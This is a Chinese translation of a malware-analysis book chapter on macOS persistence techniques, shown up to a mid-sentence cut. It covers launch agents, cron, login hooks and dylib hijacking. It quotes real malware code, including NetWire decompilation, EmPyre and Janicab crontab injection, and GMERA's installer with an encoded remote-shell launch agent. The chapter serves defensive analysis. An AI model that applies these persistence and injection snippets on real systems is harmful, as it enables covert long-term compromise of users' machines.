> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4NzkwMDA5NQ==&mid=2247484947&idx=1&sn=f00dd2acd9f5fb9da1014f5b79df0d8c

#  MAC恶意软件的艺术【卷Ⅰ】Part1-Chapter2 持久化  
网络保安29  红蓝攻防研究实验室   2025-07-11 13:31  
  
## 2.1 前言  
  
一旦恶意软件成功获得对系统的访问权限，其下一个目标通常是实现持久化。持久化是指恶意软件确保在系统启动、用户登录或其他确定性事件发生时能够自动重新执行的手段，绝大多数 macOS 恶意软件都会尝试实现持久化来获取对系统的持续访问权限。  
  
当然，并非所有恶意软件都需要持久化。勒索软件通常不需要持久化，这类恶意软件会加密用户文件，然后要求支付赎金以恢复文件。一旦恶意软件加密了用户的文件并提供了赎金支付说明，它就没有必要继续驻留。此外复杂的攻击者也可能会利用仅驻留内存的 Payloads，这些载荷通常无法在系统重启后存活，但是隐蔽性极高。  
  
尽管如此，大多数恶意软件都会以某种方式实现持久化。包括 macOS 在内的现代操作系统，为合法软件提供了多种持久化的方式。安全工具、更新程序和其他程序通常利用这些机制来确保每次系统重启时它们也能自动重启。多年来，攻击者也利用这些相同的机制来持续执行他们的恶意软件。  
  
在本章中，我们将讨论 macOS 恶意软件经常滥用（或在少数情况下可能滥用）的持久化机制。在适用的情况下，我们会重点介绍利用每种持久化技术的实际恶意样本。  
## 2.2 登录项 (Login Items)  
  
如果一个应用程序需要在用户每次登录时自动执行，那么通常会被安装为登录项。登录项在用户的桌面会话中运行，继承用户的权限，并在用户登录时自动启动。由于这种机制能提供持久性，macOS 恶意软件通常会将自身安装为登录项。像 Kitm、NetWire 和 WindTail 等恶意软件都能中找到这种技术的例子。  
  
用户可以在“系统偏好设置”应用程序中查看登录项，选择“用户与群组”面板中的“登录项”选项卡：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibR7JUiaaUUITZfNZZLgcn5CWoz2O5Z0yRkibibBTGpUGdXFevjsygGmIia2cZA3byBLjrIiaNRN0n1o4iaw/640?wx_fmt=png&from=appmsg "")  
  
由于 macOS 在其界面中不会轻易显示登录项的完整路径（除非将鼠标悬停在项目上几秒钟），所以恶意软件通常能成功伪装成合法软件。例如在下上图中，Finder 项实际上是名为 NetWire 的恶意软件。  
  
MACOS 的   
backgroundtaskmanagementagent  
 程序负责管理各种后台任务（包括登录项），这些项存储在一个名为   
backgrounditems.btm  
 的文件中。有关此文件及其格式的更多技术细节，请参阅博客文章“Block Blocking Login Items”。  
  
要以编程的方式创建登录项，软件可以调用   
LSSharedFileList*  
 API。例如，  
LSSharedFileListCreate  
 函数返回对现有登录项列表的引用，然后可以将此列表与   
LSSharedFileListInsertItemURL  
 函数一起使用，传入预期持久化为登录项的应用程序路径。  
  
下面是来自 NetWire 恶意软件的反编译代码，恶意软件已将自身复制到   
~/.defaults/Finder.app  
，然后注册为登录项持久化，确保每次用户登录时，macOS 都会自动执行它：  

```
length = snprintf_chk(&path, 0x400, ..., &#34;%s%s.app&#34;, &directory, &name);
pathAsURL = CFURLCreateFromFileSystemRepresentation(0x0, &path, length, 0x1);  
list = LSSharedFileListCreate(0x0, kLSSharedFileListSessionLoginItems, 0x0);
LSSharedFileListInsertItemURL(list, kLSSharedFileListItemLast, 0x0, 0x0, pathAsURL, ...); 
```

  
在这段代码片段中，恶意软件首先构建其在磁盘上位置的完整路径，然后调用各种 LSSharedFileList* API 将自己安装为登录项。  
  
WindTail 是另一个将自己持久化为登录项的恶意软件。通过 macOS 的 nm 实用程序，可以查看二进制文件调用的导入API，包括本例中与持久化相关的那些API：  

```
% nm WindTail/Final_Presentation.app/Contents/MacOS/usrnode
U_LSSharedFileListCreate
U_LSSharedFileListInsertItemURL
U_NSApplicationMain
U_NSHomeDirectory
U_NSUserName
```

  
在 nm 实用程序的输出中，WindTail 包含了对 LSSharedFileListCreate 和 LSSharedFileListInsertItemURL API 的引用，确保每次用户登录时都能自动启动。  
  
较新版本的 macOS 还支持特定于应用程序的辅助登录项（helper login items）。这些辅助项位于应用程序包的 LoginItems 子目录中，它们可以通过调用 SMLoginItemSetEnabled API 来确保在用户每次登录时自动重新执行。不过这些辅助登录项不会显示在上述的“系统偏好设置”面板中，这使得它们更难被发现。有关这些辅助登录项的更多信息，请参阅“Modern Login Items”博客文章。  
## 2.3 启动代理与守护进程 (Launch Agents and Daemons)  
  
MACOS还有一种称为启动项（launch items）的机制，用于持久化非应用程序二进制文件，如软件更新程序和后台进程等。大多数 macOS 恶意软件会在后台隐蔽运行，利用启动项来实现持久化。根据“Mac Malware of 2019”报告，当年分析的每一款进行持久化的恶意软件都会将其自身注册为启动项，包括 NetWire、Siggen、GMERA 等等。  
  
启动项有两种：启动代理（launch agents）和启动守护进程（launch daemons）。  
  
启动守护进程是非交互式的，通常在用户登录前启动，以 root 权限运行。此类守护进程的一个例子是 macOS 的软件更新器   
softwareupdated  
。  
  
启动代理在用户登录后以标准用户权限运行，并可以与用户会话交互。例如 macOS 的通知中心程序   
NotificationCenter  
，负责向用户显示通知，就是作为一个持久的启动代理运行的。  
  
我们可以在 macOS 的 /Library/LaunchDaemons 目录中找到第三方启动守护进程，第三方启动代理则存储在 /Library/LaunchAgents 或 ~/Library/LaunchAgents 目录中。要将自身持久化为启动项，需要在这些目录中创建一个启动项属性列表（property list）。属性列表（plist）是一种 XML、JSON 或二进制格式的文件，包含键/值对，可以存储配置信息、设置、序列化对象等数据，这些文件在 macOS 中无处不在。  
  
我们在第 1 章中已经探讨过应用程序的 Info.plist 文件，要查看属性列表文件的内容（无论其格式如何），请使用以下命令之一：  

```
plutil -p <path to plist>
defaults read <path to plist>
```

  
启动项的属性列表文件向 launchd（负责处理此类 plist 的系统守护进程）描述该启动项。相关的键/值对包括：  

```
Label: 标识启动项的名称。通常以反向域名符号（reverse domain name notation）书写，如 com.companyName.itemName。
Program或 ProgramArguments: 包含启动项的可执行脚本或二进制的路径。传递给此可执行项的参数是可选的，但如果使用 ProgramArguments 键则可以指定。
RunAtLoad: 包含一个布尔值，如果设置为 true，则指示 launchd 自动启动该启动项。如果是启动守护进程，它将在系统初始化期间启动。另一方面，由于启动代理是用户特定的，它们将在用户启动登录过程后稍晚启动。
```

  
这三个键/值对就足以创建一个持久的启动项。为了演示这一点，让我们创建一个名为 com.foo.bar 的启动项：  

```
<?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?>
<!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;>
<plist version=&#34;1.0&#34;>
<dict>
    <key>Label</key>
    <string>com.foo.bar</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/user/launchItem</string>
        <string>foo</string>
        <string>bar</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

  
通过 ProgramArguments 数组，该启动项指示 launchd 执行文件 /Users/user/launchItem，并带有两个命令行参数：foo 和 bar。由于 RunAtLoad 键设置为 true ，该文件将在用户登录之前被自动执行。  
  
有关启动项的全面讨论，包括 plist 及其键/值对，请参阅“A Launchd Tutorial”或“Getting Started with Launchd”。这些资源讨论了恶意软件可能用于持久化的其他键/值对（除了 RunAtLoad），例如 PathState 和 StartCalendarInterval。将自身持久化为启动项的恶意软件相当普遍，来看几个例子。  
  
本章前面展示了恶意软件 NetWire 如何作为登录项持久化，但同时它也作为启动代理持久化，如果受害者发现并移除了一种持久化机制，他们可能会认为这是唯一的机制而忽略了另一个，恶意软件将在用户每次登录时继续自动重启。检查该恶意软件的二进制文件，可以发现地址 0x0000db60 处嵌入了一个属性列表模板：  

```
<plist version=\&#34;1.0\&#34;>
<dict>
  <key>Label</key>
  <string>%s</string>
  <key>ProgramArguments</key>
  <array>
    <string>\%s</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <%s/>
</dict>
</plist>
```

  
在安装时，恶意软件会动态填充此 plist 模板，例如，将 ProgramArguments 数组中的 %s 替换为恶意软件在系统上的二进制路径。由于 RunAtLoad 键设置为 true ，macOS 将在系统重启用户登录时启动此二进制文件。  
  
NetWire 的以下反编译代码片段显示，在配置好启动代理属性列表后，该属性列表被写入用户的启动代理目录 ~/Library/LaunchAgents：  

```
...eax = getenv(&#34;HOME&#34;);
eax = snprintf_chk(&var_6014, 0x400, 0x0, 0x400, &#34;%s/Library/LaunchAgents/&#34;, eax); ➊
eax = snprintf_chk(edi, 0x400, 0x0, 0x400, &#34;%s%s.plist&#34;, &var_6014, 0xe5d6); ➋
edi = open(edi, 0x601);
if (edi >= 0x0) {
    write(edi, var_688C, ebx); ➌
}
```

  
在反编译代码中，可以看到恶意软件首先调用 getenv API 获取 HOME 环境变量的值，该值设置为当前用户的主目录。然后将该值传递给 snprintf_chk API，以动态构建用户 LaunchAgents 目录的路径➊。  
  
再次调用 snprintf_chk 以附加属性列表文件的名称➋，由于此名称在运行时由恶意软件解密，因此在反编译代码片段中不会以明文形式显示。  
  
构造完整路径后，便将动态配置的 plist 写入➌。代码执行后，可以通过 macOS 的 defaults 等工具检查 .plist 文件 (~/Library/LaunchAgents/com.mac.host.plist)：  

```
% defaults read ~/Library/LaunchAgents/com.mac.host.plist
{
    KeepAlive = 0;
    Label = &#34;com.mac.host&#34;;
    ProgramArguments = ( 
        &#34;/Users/user/.defaults/Finder.app/Contents/MacOS/Finder&#34;
    );
    RunAtLoad = 1; 
}
```

  
从输出中注意到，恶意软件的持久化组件路径可以在 ProgramArguments 数组中找到：/Users/user/.defaults/Finder.app/Contents/MacOS/Finder。如前所述，恶意软件在运行时以编程方式确定当前用户的主目录，因为该目录名称对于每个受感染系统可能是唯一的。  
  
为了隐藏自己，NetWire 将其持久化的二进制文件 Finder 安装到它创建的一个名为 .defaults 的目录中。通常macOS 不会显示以"."开头的目录（可以通过在 Finder 中按 COMMAND-SHIFT-SPACE[-SPACE] 或使用终端中的 ls -a 命令指示 Finder 显示此类隐藏文件）。  
  
在 .plist 文件中，RunAtLoad 键设置为 1（true），这指示系统在用户每次登录时自动启动恶意软件的二进制文件。  
  
另一个将自己持久化为启动项的 macOS 恶意软件是 GMERA。它作为一个木马化的加密货币交易应用程序分发，其应用程序包的 Resources/ 目录中包含一个名为 run.sh 的安装程序脚本：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibR7JUiaaUUITZfNZZLgcn5CWEqLw5f1L9j3yZHibL2POiaib3ld96kKTdCMfRjOf9dabtP1PEDwewfjGw/640?wx_fmt=png&from=appmsg "")  
  
检查此脚本会发现恶意软件安装一个持久且隐藏的启动代理到 ~/Library/LaunchAgents/.com.apple.upd.plist 的命令：  

```
#!/bin/bash
plist_text=&#34;PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZzoiVVRGLTgiPz4KPCFETONUWVBFIHBsaXNOIFBVQkxJQyAiLS8vQXBwbGUvLORURCBQTE1TVCAxLjAvLOVOIiAiaHROCDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJOeUxpc3QtMS4wLmROZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KCTxrZXk+S2V1cEFsaXZlPC9rZXk+Cgk8dHJ1ZS8+Cgk8a2V5PkxhYmVsPC9rZXk+Cgk8c3RyaW5nPmNvbS5hcHBsZXMuYXBwcy51cGQ8L3NOcmluZz4KCTxrZXk+UHJvZ3JhbUFyZ3VtZW50czwva2V5PgoJPGFycmF5PgoJCTxzdHJpbmc+c2g8L3NocmluZz4KCQk8c3RyaW5nPi1jPC9zdHJpbmc+CgkJJPHNOcmluZz5lY2hvICdkMmhwYkdV209qc2daRzhnYzJ4bFpYQWdNVEF3TURBNo1ITmpjbVZsYmlBdFdDQnhkV2wwT3lCc2MyOW1JQzEwYVNBNk1qVTNNek1nZkNCNF1YSm5jeUJyYVd4c01DMDVPeUJ6WTNKbFpXNGdMV1FnTFcwZ1ltRnphQOFOWX1BblltRnphQoFoYVNBK0wyUmxkaTkwTNBdk1Ua3pMakozTGpJeE1pNHhOell2TWpVM016TWdNRDRtTVNjNolHUnZibVU9JyB8IGJhc2U2NCAtLWRlY29kZSB8IGJhc2g8L3N0cmluZz4KCTwvYXJyYXk+Cgk8a2V5PlJ1bkFOTG9hZDwva2V5PgoJPHRydWUvPgo8L2RpY3Q+CjwvcGxpc3Q+&#34;
echo &#34;$plist_text&#34; | base64 --decode ➊ > &#34;/tmp/.com.apple.upd.plist&#34;
cp &#34;/tmp/.com.apple.upd.plist&#34; &#34;$HOME/Library/LaunchAgents/.com.apple.upd.plist&#34; ➋
launchctl load &#34;/tmp/.com.apple.upd.plist&#34; ➌
```

  
plist 的混淆内容存在于名为 plist_text 的变量中。恶意软件使用 macOS 的 base64 命令对 plist 进行解码➊，并将其作为 .com.apple.upd.plist 写入 /tmp 目录。然后，通过 cp 命令，将其复制到用户的 LaunchAgents 目录➋。最后，它通过 launchctl 命令启动该启动代理➌。  
  
安装程序脚本执行后，可以检查现在已解码的启动代理属性列表 .com.apple.upd.plist：  

```
<?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?>
<!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;...&#34;>
<plist version=&#34;1.0&#34;>
<dict>
    <key>KeepAlive</key>
    <true/>
    <key>Label</key>
    <string>com.apples.apps.upd</string>
    <key>ProgramArguments</key>
    <array>
        <string>sh</string>
        <string>-c</string>
        <string>echo 'd2hpbGUg0js...RvbmU=' | base64 --decode | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

  
由于 RunAtLoad 键设置为 true ，ProgramArguments 数组中指定的命令（解码后是一个远程 shell）将在用户每次登录时自动执行。  
  
我们再来看看作为启动项持久化的最后一个例子 EvilQuest。如果该恶意软件以 root 权限运行，它会将自己持久化为一个启动守护进程；而如果 EvilQuest 发现自己仅以用户权限运行，它会改为创建一个用户启动代理。  
  
为了实现这种持久化，EvilQuest 包含一个嵌入的属性列表模板，用于创建启动项。但是为了增加分析难度，该模板被加密了。在后续章节中，我将描述如何应对此类反分析手法，但现在只需知道我们可以利用调试器，等待恶意软件自己解密嵌入的属性列表模板。然后我们就可以在内存中查看到未加密的 plist 模板：  

```
### % lldb /Library/mixednkey/toolroomd
(lldb) x/s $rax
0x100119540: &#34;<?xml version=\&#34;1.0\&#34; encoding=\&#34;UTF-8\&#34;?>
<!DOCTYPE plist PUBLIC \&#34;-//Apple//DTD PLIST 1.0//EN\&#34; \&#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\&#34;>
<plist version=\&#34;1.0\&#34;>
<dict>
  <key>Label</key>
  <string>%s</string>
  <key>ProgramArguments</key>
  <array>
    <string>%s</string>
    <string>--silent</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>&#34;
```

  
这里我们使用 macOS 调试器 lldb 来启动名为 toolroomd 的文件。恶意软件解密了 plist 模板并将其内存地址存储在 RAX 寄存器中，通过 x/s 命令显示现在解密的模板。  
  
更简单的方法是在独立的分析环境或虚拟机中执行恶意软件，并等待恶意软件写出其启动项属性列表。一旦 EvilQuest 完成安装并持久感染系统，可以在 /Library/LaunchDaemons 目录中找到其启动守护进程属性列表，名为 com.apple.questd.plist：  

```
<?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?>
<!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;>
<plist version=&#34;1.0&#34;>
<dict>
    <key>Label</key>
    <string>questd</string>
    <key>ProgramArguments</key>
    <array> 
        <string>sudo</string>
        <string>/Library/AppQuest/com.apple.questd</string>
        <string>--silent</string>
    </array>
    <key>RunAtLoad</key> 
    <true/>
</dict>
</plist>
```

  
RunAtLoad 键设置为 true ，ProgramArguments 数组中保存的值将在每次系统重启时自动执行。  
## 2.4 计划任务与任务 (Scheduled Jobs and Tasks)  
  
在 macOS 上，有各种方法可以在指定间隔调度任务或任务运行。恶意软件可以滥用这些机制在受感染的 macOS 系统上维持持久化。本节将探讨几种这样的调度机制，例如 cron 任务、at 任务和定期脚本。请注意，启动项也可以通过 StartCalendarInterval 键调度在特定间隔运行，但由于我们在本章前面已经讨论过它们，这里就不再赘述。  
### 2.4.1 Cron 任务  
  
macOS 提供了几种类 Unix 的持久化机制，例如 Cron 任务。系统管理员经常利用它来持久地在特定时间执行脚本、命令和二进制文件。与前面讨论的登录项和启动项不同，cron 任务通常在特定间隔（如每小时、每天或每周）自动执行，而不是在特定事件（如用户登录）时执行。用户可以通过内置的 /usr/bin/crontab 实用程序来调度持久的 cron 任务。  
  
在 macOS 恶意软件中，滥用 cron 任务进行持久化其实并不特别常见。流行的开源攻击后渗透框架 EmPyre（有时被针对 macOS 用户的攻击者使用）提供了一个例子，在其 crontab 持久化模块中，EmPyre 直接调用 crontab 二进制文件来将自身安装为 cron 任务：  

```
cmd = 'crontab -l | { cat; echo &#34;0 * * * * %s&#34;; } | crontab -' 
subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read() 
```

  
EmPyre 首先通过连接多个子命令来构建一个字符串，这些命令共同添加一个新的恶意 cron 任务以及任何当前的 cron 任务。crontab 命令（带 -l 标志）将列出用户现有的 cron 任务。cat 和 echo 命令追加新的命令。最后，crontab 命令（带 - 标志）将重新安装所有现有任务以及新的 cron 任务。  
  
一旦这些命令被连接在一起（并存储到   
cmd  
 变量中），它们将通过 Python 的   
subprocess  
 模块的   
Popen  
 API 执行。  
cmd  
 变量中的   
%s  
 将在运行时更新为要持久化的项目的路径，而   
0 * * * *  
 部分指示 macOS 每小时执行一次该任务。有关 cron 的全面讨论，包括任务创建的语法，请自行查阅相关资料。  
  
让我们看一下 cron 任务持久化的另一个例子，该恶意软件 Janicab 将一个编译好的 Python 脚本 runner.pyc 持久化为一个 cron 任务：  

```
subprocess.call(&#34;crontab -l > /tmp/dump&#34;, shell=True)
subprocess.call(&#34;echo \&#34;* * * * * python ~/.t/runner.pyc\&#34; >> /tmp/dump&#34;, shell=True)
subprocess.call(&#34;crontab /tmp/dump&#34;, shell=True)
subprocess.call(&#34;rm -f /tmp/dump&#34;, shell=True)
```

  
Janicab 的 Python 安装程序首先将任何现有的 cron 任务保存到一个名为 /tmp/dump 的临时文件中。然后它将新的任务追加到这个文件，然后调用 crontab 来完成 cron 任务的安装。一旦添加了新的 cron 任务，macOS 将每分钟执行指定的命令 python ~/.t/runner.pyc。这个编译好的 Python 脚本确保恶意软件始终运行，并在必要时重启它。  
### 2.4.2 At 任务  
  
在 macOS 上实现持久化的另一种方式是通过 at 任务，即计划的一次性任务。我们可以在 /private/var/at/jobs/ 目录中找到 at 任务，这些任务由 atrun 守护进程处理。atrun 守护进程每分钟检查一次该目录，并执行任何计划在或早于当前时间运行的任务。与 cron 任务不同，at 任务仅执行一次。  
  
在默认安装的macOS中，at调度程序/usr/libexec/atrun处于禁用状态，但恶意软件可通过root权限启用它：  

```
# launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist
```

  
启用此调度程序后，恶意软件只需将持久化命令通过管道输入/usr/bin/at并指定执行时间/日期，即可创建at 任务。任务执行后，恶意软件可通过重新调度该任务维持持久化。  
  
（原文中说目前尚无Mac恶意软件采用此方法实现持久化，但实际上  
恶意软件可以通过在 at 任务中安排自身在未来某个时间点重新执行，从而滥用此机制实现持久化。例如，恶意软件可以安排一个任务在 24 小时后运行，该任务再次执行恶意软件，然后安排另一个在 24 小时后运行的任务，如此循环往复。）  
### 2.4.3 周期性脚本 (Periodic Scripts)  
  
macOS 包含一个名为 periodic 的实用程序，用于在特定时间间隔执行系统维护脚本。这些脚本位于 /etc/periodic 目录的子目录中：daily、weekly 和 monthly 中  
：  

```
% ls /etc/periodic
daily
weekly
monthly
```

  
尽管该目录归root所有，但具备足够权限的恶意软件可在此创建（或篡改）周期性脚本，以此实现定期持久化。  
  
/etc/periodic/daily 目录中的脚本每天运行一次，/etc/periodic/weekly 中的脚本每周运行一次，依此类推。/etc/crontab 文件控制这些脚本的执行时间：  

```
# /etc/crontab
...
15      3       *       *       *       root    periodic daily
30      4       *       *       6       root    periodic weekly
30      5       1       *       *       root    periodic monthly
...
```

  
从 /etc/crontab 文件中可以看到，periodic daily 命令每天在凌晨 3:15 运行，periodic weekly 命令在每周六凌晨 4:30 运行，而 periodic monthly 命令在每月第一天的凌晨 5:30 运行。  
  
虽然周期性脚本在概念上与 cron 任务相似，但仍存在差异（例如由独立守护进程处理）。当前尚无恶意软件利用此方法实现持久化。  
## 2.5 登录与登出钩子（Login and Logout Hooks）  
  
在 macOS 上实现持久化的另一种方式是通过登录/登出 Hooks。注册为登录或登出 Hooks 的脚本或命令会在用户登录或登出时自动执行。这些 Hooks 存储在用户专属的 ~/Library/Preferences/com.apple.loginwindow.plist 文件中，以键值对形式存在。键名应为 LoginHook 或 LogoutHook，其字符串值指向登录/登出时执行的文件路径：  

```
<?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?>
<!DOCTYPE plist ...>
<plist version=&#34;1.0&#34;>
 <dict> 
  <key>LoginHook</key>
  <string>/usr/bin/hook.sh</string> 
 </dict>
</plist>
```

  
此例中，用户每次登录时将执行脚本 hook.sh。系统仅允许同时存在一个 LoginHook 和一个 LogoutHook 键值对，若攻击者发现系统已存在合法 Hook，可通过向现有 Hook 追加命令实现持久化。  
  
可能因 Apple 已弃用此技术，目前尚无恶意软件利用此类Hook。  
## 2.6 动态库（Dynamic Libraries）  
  
动态库（dylib）是包含可执行代码的模块，进程可加载并执行。Apple 开发者文档指出操作系统"已实现应用所需的大部分功能库"，因此开发者可链接这些库而非从头实现功能。静态链接库会增加程序体积和内存占用，且库中漏洞需重新编译程序才能修复。动态链接仅添加程序依赖项，实际库代码不编译进程序，程序启动或调用库功能时动态加载库，减小程序体积和内存占用，且程序自动受益于库的修复和更新。  
  
多数 macOS 持久化机制会自动启动独立应用或二进制文件，产生新进程，易被用户或安全工具检测。更隐蔽的持久化通常利用动态库实现，这些库在受信任的宿主进程内加载，不会创建新进程，进程列表和安全工具难以察觉其存在。  
  
动态库持久化原理一般是攻击者先定位定期自动启动或用户手动启动的进程（如浏览器），然后强制该进程加载恶意动态库。本节先讨论攻击者滥用动态库的通用方法，再探索基于插件机制的隐蔽执行方案。  
  
需注意：动态库除持久化外，还可用于劫持目标进程（如浏览器），且库加载后继承宿主进程权限，可能获取摄像头/麦克风等敏感资源访问权。  
### 2.6.1 DYLD_* 环境变量注入  
  
通过 DYLD_INSERT_LIBRARIES 或 DYLD_FRAMEWORK_PATH 等环境变量，可在进程加载时将任意动态库注入目标进程。动态加载器（dyld）在加载进程时会读取 DYLD_INSERT_LIBRARIES 变量并加载其指定的库，若进程常自动启动或用户频繁启动，此技术可以提供高持久化的隐蔽性。  
  
持久化注入动态库的具体方法因目标而异：  
  
针对启动项：修改其属性列表（plist），插入 EnvironmentVariables 键（值为包含 DYLD_INSERT_LIBRARIES 键的字典，指向恶意库）  
  
针对应用：修改应用 Info.plist，插入 LSEnvironment 键（值同上）  
  
示例：FlashBack 恶意软件通过篡改 Safari 的 Info.plist 实现持久化：  

```
<key>LSEnvironment</key>
<dict>
 <key>DYLD_INSERT_LIBRARIES</key>
 <string>/Applications/Safari.app/Contents/Resources/UnHackMeBuild</string>
</dict>
```

  
FlashBack 添加的 LSEnvironment 字典包含指向恶意动态库的 DYLD_INSERT_LIBRARIES 键值对，此后 Safari 启动时，macOS 将在其上下文中加载并执行该库。  
  
自 2012 年 FlashBack 滥用此技术后，Apple 大幅限制   
DYLD_*  
 环境变量作用域。例如 dyld 在以下场景会忽略这些变量：  

```
Apple 平台二进制文件


启用强化运行时（hardened runtime）的第三方应用
```

  
强化运行时还提供其他安全防护（如阻止后续讨论的动态库注入）。详见 Apple 文档《Hardened Runtime》。  
  
但许多系统组件和流行第三方应用仍支持加载任意动态库。即使启用强化运行时，若应用拥有 com.apple.security.cs.allow-dyld-environment-variables 或 com.apple.security.cs.disable-library-validation 权限，恶意库仍可被加载，因此动态库持久化机会依然存在。  
### 2.6.2 动态库代理（Dylib Proxying）  
  
更高级的动态库注入技术是动态库代理，该技术用恶意库替换目标进程依赖的库，使目标应用启动时加载并执行恶意库，而且为保留应用功能，恶意库将请求代理至原始库。  
  
实现方式：创建包含 LC_REEXPORT_DYLIB 加载命令的动态库，该命令告知动态加载器真正实现功能的原始库所在（第 5 章将详述加载命令），加载器据此保持被代理库的功能。  
  
虽尚未发现恶意软件滥用此技术，但安全研究者已用它劫持各类应用。例如：笔者曾通过劫持 Zoom 实现摄像头访问和持久化，用户每次启动视频会议应用时，恶意代码静默执行。  
  
具体攻击细节：Zoom 应用虽启用强化运行时，但旧版包含 com.apple.security.cs.disable-library-validation 权限，允许加载任意库。攻击者可代理 Zoom 的依赖库（如 SSL 库 libssl.1.0.0.dylib）：  
  
复制合法 SSL 库为 libssl.1.0.0_COPY.dylib；  
  
创建同名恶意代理库，内含指向副本库的 LC_REEXPORT_DYLIB 命令；  
  
通过 otool 查看恶意库加载命令可验证此结构：  

```
% otool -l zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib
...
Load command 11
 cmd LC_REEXPORT_DYLIB
 cmdsize 96
 name /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0_COPY.dylib
...
```

  
代理库中的重导出指令指向原始 SSL 库副本，确保应用功能不受损。恶意代理库配置完成后，用户启动 Zoom 时将自动加载并执行其构造函数。除持久化外，恶意代码还继承 Zoom 的隐私权限（如麦克风/摄像头），可监视用户。  
### 2.6.3 动态库劫持（Dylib Hijacking）  
  
动态库劫持是比动态库代理更隐蔽（但适用性较低）的技术。攻击者利用两类漏洞：  
  
程序从多个可写位置加载库：若主位置无库文件，程序会搜索备用位置。攻击者在主位置放置同名恶意库，程序将加载该库。  
  
示例：某应用先搜索应用目录 /Library/foo.dylib，再搜索 /System/Library/foo.dylib。若主位置无文件，攻击者可在该路径植入恶意库。  
  
程序对不存在库的弱依赖：程序始终查找弱依赖库，但库不存在时仍能运行。若攻击者将恶意库植入弱依赖位置，程序将在后续启动时加载它。  
  
具体案例：旧版 macOS（如 OS X 10.10）中，Apple 的 iCloud 照片流服务尝试从iPhoto.app/Contents/Library/LoginItems/或 iPhoto.app/Contents/Framework/ 加载 PhotoFoundation 库。因库实际位于第二路径，攻击者可在主路径植入同名恶意库，服务后续启动时将优先加载恶意库。因该服务随用户登录自动启动，此技术实现高隐蔽持久化：  

```
$ reboot 
$ lsof -p <照片流服务PID>
...
/Applications/iPhoto.app/Contents/Library/LoginItems/PhotoFoundation.framework/.../PhotoFoundation
```

  
更多技术细节参见研究论文《Dylib hijacking on OS X》或《MacOS Dylib Injection through Mach-O Binary Manipulation》。  
  
虽未见真实恶意软件利用此技术持久化，但后渗透工具 EmPyre 包含基于动态库劫持的持久化模块：  

```
import base64
class Module:
 def __init__(self, mainMenu, params=[]):
 self.info = {
 'Name': 'CreateDylibHijacker',  # 模块名称
 'Author': ['@patrickwardle,@xorrior'],  # 作者
 'Description': ('配置用于动态库劫持的EmPyre库，需提供漏洞应用的合法库路径...'),  # 功能描述
 'Background': False,  # 无需后台运行
 'OutputExtension': &#34;&#34;,  # 输出扩展名
 'NeedsAdmin': True,   # 需管理员权限
 'OpsecSafe': False,   # 非操作安全
 'Comments': [  # 备注
 'https://www.virusbulletin.com/.../dylib-hijacking-os-x' 
 ]
 }
```

  
动态库劫持仅适用于特定漏洞应用（即从多位置搜索库或存在弱依赖）。若攻击者将其用于持久化，漏洞应用需常自动启动或频繁手动启动。此外，新版 macOS 的强化运行时等防护机制可降低动态库注入影响，因其普遍阻止加载任意动态库。  
### 2.6.4 插件（Plug-ins）  
  
许多 Apple 守护进程和第三方应用程序在设计上支持插件或扩展（无论是动态库、软件包还是其他文件格式）。虽然插件本意是合法扩展程序功能，但攻击者可滥用此特性在宿主进程上下文中实现隐蔽持久化。实现方式通常是创建兼容插件并将其安装到程序的插件目录中。  
  
例如，所有现代浏览器都支持插件或扩展，这些组件在浏览器每次启动时自动执行，为恶意代码提供便捷的持久化途径。此外，此类插件能直接访问用户浏览会话，使广告软件等恶意代码得以展示广告、劫持流量、窃取保存的密码等。  
  
这些扩展的隐蔽性很强。以恶意浏览器扩展 Pitchofcase 为例，安全研究员 Phil Stokes 在分析报告中指出，"Pitchofcase 看起来与普通广告插件无异，启用后，它通过付费点击地址重定向用户搜索，最终跳转至 pitchofcase.com。该扩展在后台隐形运行，既无工具栏按钮也无任何交互接口"。他还强调，即使用户点击图中的卸载按钮，该扩展也不会被真正移除：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibR7JUiaaUUITZfNZZLgcn5CWHaZPDAIAjqbmg2YBtUZJFF71icLwYnUTr7C0X9M5ia8cIUPd5rrvctAg/640?wx_fmt=png&from=appmsg "")  
  
近期恶意浏览器扩展还包括 Shlayer、Bundlore 和 Pirrit。其中 Pirrit 尤为值得关注，它是首个原生针对 Apple 2020 年发布的 M1 芯片的恶意软件。  
  
当然，攻击者也能以类似方式劫持其他类型应用。安全研究员 Pedro Vilaça 在博文《iTunes Evil Plugin Proof of Concept》中演示：攻击者可强制 OS X 10.9 系统的 iTunes 加载恶意插件，因用户可写入 iTunes 插件目录，木马释放器可轻易加载恶意插件，或将其用作远控软件的通信通道。他进一步描述恶意插件如何通过劫持 iTunes 窃取用户凭证，但同时也强调：由于每次启动 iTunes 时该插件都自动加载执行，它实际上也提供了持久化能力。  
  
攻击者可能滥用  
